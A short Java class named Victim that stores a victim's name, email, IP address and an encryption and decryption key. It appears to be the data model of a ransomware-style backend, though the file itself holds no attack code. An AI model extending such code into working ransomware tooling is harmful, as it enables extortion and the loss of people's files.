package backend;

public class Victim {

    private int id;
    private String name;
    private String email;
    private String ip;

    private String encryptKey;

    private String decryptKey;

    public Victim(int id, String name, String email, String ip, String encryptKey, String decryptKey) {
        this.id = id;
        this.name = name;
        this.email = email;
        this.ip = ip;
        this.encryptKey = encryptKey;
        this.decryptKey = decryptKey;
    }

    public Victim(String name, String email, String ip, String encryptKey, String decryptKey) {
        this.name = name;
        this.email = email;
        this.ip = ip;
        this.encryptKey = encryptKey;
        this.decryptKey = decryptKey;
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getEmail() {
        return email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

    public String getIp() {
        return ip;
    }

    public void setIp(String ip) {
        this.ip = ip;
    }

    public String getEncryptKey() {
        return encryptKey;
    }

    public void setEncryptKey(String encryptKey) {
        this.encryptKey = encryptKey;
    }

    public String getDecryptKey() {
        return decryptKey;
    }

    public void setDecryptKey(String decryptKey) {
        this.decryptKey = decryptKey;
    }
}
